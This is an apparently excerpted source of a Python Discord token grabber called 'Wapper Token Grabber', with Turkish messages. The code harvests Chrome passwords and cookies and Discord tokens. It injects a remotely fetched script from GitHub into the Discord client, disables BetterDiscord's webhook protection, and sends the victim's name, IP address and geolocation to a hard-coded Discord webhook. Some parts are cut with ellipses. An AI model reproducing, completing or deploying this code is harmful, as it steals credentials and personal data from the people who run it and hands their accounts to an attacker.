...
class Wapper_Token_Grabber:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/927146672566435870/GzQ0HCEhmWAns8bxBgJEqtwXJ_D2an7EzsQh1lbzrNCchGf69O-xgW0RsrEpM5r1KHQ2"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Wapper_Token_Grabber"
        ...
        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"{os.getlogin()} google kurulu degil\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.grabTokens()
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Wapper"))
                    except FileNotFoundError:
                        pass
                    f = requests.get("https://raw.githubusercontent.com/asfjnkasdjnfask/asgadfhfgjfhsgjosndfgo/main/Inject").text.replace("%WEBHOOK_LINK%", self.webhook)
    ...
    def bypass_better_discord(self):
        ...
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "WapperLOL")
        with open(bd, 'w'): pass
    ...
    def SendInfo(self):
        ...
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Dosya Bulundu: "
        embed = {
            ...
            "embeds": [
                {
                    "author": {
                        "name": "Wapper Grabber.",
                        "url": "https://media.discordapp.net/attachments/926741851875184671/937843909831299132/unknown.png",
                        "icon_url": "https://media.discordapp.net/attachments/926741851875184671/937751223308808192/hyouka-anime_1.gif"
                    },
                    "description": f"**{os.getlogin()}** Dosyayı Çalıştırdı.\n```fix\nBilgisayar adı: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nŞehir: {city}\nBölge: {region}\nÜlke: {country}```[Google Haritalar Konumu]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 10066329,

                    "thumbnail": {
                      "url": "https://media.discordapp.net/attachments/926741851875184671/937752154444275772/9368e758c136c60e13814c7d64415978.gif"
                    },       
